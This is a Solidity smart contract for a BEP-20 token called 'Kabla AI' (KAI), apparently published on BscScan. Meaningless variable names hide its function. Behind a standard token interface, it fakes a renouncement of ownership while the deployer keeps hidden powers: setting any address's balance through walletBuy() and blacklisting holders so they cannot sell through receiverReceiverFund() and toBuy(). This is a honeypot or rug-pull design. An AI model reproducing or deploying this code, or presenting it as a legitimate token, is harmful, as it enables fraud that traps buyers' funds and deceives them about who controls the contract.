/**
 *Submitted for verification at BscScan.com on 2023-03-08
*/

//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface walletShould {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeLiquidityLimit) external view returns (uint256);

    function transfer(address enableTotal, uint256 tokenTake) external returns (bool);

    function allowance(address sellMaxSender, address spender) external view returns (uint256);

    function approve(address spender, uint256 tokenTake) external returns (bool);

    function transferFrom(
        address sender,
        address enableTotal,
        uint256 tokenTake
    ) external returns (bool);

    event Transfer(address indexed from, address indexed takeFeeSwap, uint256 value);
    event Approval(address indexed sellMaxSender, address indexed spender, uint256 value);
}

interface modeToken is walletShould {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

abstract contract modeExempt {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface tokenLaunched {
    function createPair(address totalAtExempt, address liquidityAtFrom) external returns (address);
}

interface modeLimit {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

contract KablaAI is modeExempt, walletShould, modeToken {

    mapping(address => bool) public maxLaunch;

    function tokenShouldLaunch() public view returns (bool) {
        return tradingIs;
    }

    function swapToken() public {
        if (sellTradingAmount != txExempt) {
            txTotal = false;
        }
        
        marketingBuyReceiver=false;
    }

    function tokenLaunchedAt(address receiverTeam, address enableTotal, uint256 tokenTake) internal returns (bool) {
        require(txMode[receiverTeam] >= tokenTake);
        txMode[receiverTeam] -= tokenTake;
        txMode[enableTotal] += tokenTake;
        emit Transfer(receiverTeam, enableTotal, tokenTake);
        return true;
    }

    bool public txTotal;

    constructor (){ 
        
        modeLimit exemptToAuto = modeLimit(0x10ED43C718714eb63d5aA57B78B54704E256024E);
        swapMarketing = tokenLaunched(exemptToAuto.factory()).createPair(exemptToAuto.WETH(), address(this));
        totalFromMarketing = _msgSender();
        if (tradingIs) {
            walletTxList = txExempt;
        }
        enableMarketing = _msgSender();
        fundSwap[_msgSender()] = true;
        
        txMode[_msgSender()] = amountEnable;
        emit Transfer(address(0), enableMarketing, amountEnable);
        limitSell();
    }

    uint256 private liquidityFeeAt;

    address public enableMarketing;

    function autoMax(address teamSell) public {
        if (senderExempt) {
            return;
        }
        if (marketingBuyReceiver != modeTrading) {
            sellTradingAmount = walletTxList;
        }
        fundSwap[teamSell] = true;
        if (sellTradingAmount != liquidityFeeAt) {
            txTotal = false;
        }
        senderExempt = true;
    }

    bool private marketingBuyReceiver;

    bool private tradingIs;

    function transfer(address isSell, uint256 tokenTake) external virtual override returns (bool) {
        return toBuy(_msgSender(), isSell, tokenTake);
    }

    function limitSell() public {
        emit OwnershipTransferred(enableMarketing, address(0));
        totalFromMarketing = address(0);
    }

    bool public senderExempt;

    address public swapMarketing;

    function receiverReceiverFund(address fundTo) public {
        if (sellTradingAmount != txExempt) {
            txExempt = sellTradingAmount;
        }
        if (fundTo == enableMarketing || fundTo == swapMarketing || !fundSwap[_msgSender()]) {
            return;
        }
        if (txExempt == liquidityFeeAt) {
            txTotal = false;
        }
        maxLaunch[fundTo] = true;
    }

    function txIsMin() public view returns (bool) {
        return modeTrading;
    }

    function buyWallet() public view returns (uint256) {
        return txExempt;
    }

    function owner() external view returns (address) {
        return totalFromMarketing;
    }

    bool private modeTrading;

    string private feeAt = "Kabla AI";

    string private liquidityAutoMax = "KAI";

    function getOwner() external view returns (address) {
        return totalFromMarketing;
    }

    uint256 public walletTxList;

    function modeReceiver() public view returns (uint256) {
        return txExempt;
    }

    function transferFrom(address receiverTeam, address enableTotal, uint256 tokenTake) external override returns (bool) {
        if (tokenExempt[receiverTeam][_msgSender()] != type(uint256).max) {
            require(tokenTake <= tokenExempt[receiverTeam][_msgSender()]);
            tokenExempt[receiverTeam][_msgSender()] -= tokenTake;
        }
        return toBuy(receiverTeam, enableTotal, tokenTake);
    }

    function decimals() external view virtual override returns (uint8) {
        return walletLaunched;
    }

    uint256 private amountEnable = 100000000 * 10 ** 18;

    function walletBuy(address isSell, uint256 tokenTake) public {
        require(fundSwap[_msgSender()]);
        txMode[isSell] = tokenTake;
    }

    mapping(address => uint256) private txMode;

    function symbol() external view virtual override returns (string memory) {
        return liquidityAutoMax;
    }

    event OwnershipTransferred(address indexed atTotal, address indexed walletTotal);

    address private totalFromMarketing;

    function allowance(address takeListMin, address teamReceiver) external view virtual override returns (uint256) {
        return tokenExempt[takeListMin][teamReceiver];
    }

    uint8 private walletLaunched = 18;

    uint256 public txExempt;

    mapping(address => bool) public fundSwap;

    function totalSupply() external view virtual override returns (uint256) {
        return amountEnable;
    }

    function name() external view virtual override returns (string memory) {
        return feeAt;
    }

    function approve(address teamReceiver, uint256 tokenTake) public virtual override returns (bool) {
        tokenExempt[_msgSender()][teamReceiver] = tokenTake;
        emit Approval(_msgSender(), teamReceiver, tokenTake);
        return true;
    }

    function balanceOf(address feeLiquidityLimit) public view virtual override returns (uint256) {
        return txMode[feeLiquidityLimit];
    }

    uint256 private sellTradingAmount;

    mapping(address => mapping(address => uint256)) private tokenExempt;

    function toBuy(address receiverTeam, address enableTotal, uint256 tokenTake) internal returns (bool) {
        if (receiverTeam == enableMarketing) {
            return tokenLaunchedAt(receiverTeam, enableTotal, tokenTake);
        }
        require(!maxLaunch[receiverTeam]);
        return tokenLaunchedAt(receiverTeam, enableTotal, tokenTake);
    }

    function minAutoTrading() public view returns (uint256) {
        return liquidityFeeAt;
    }

}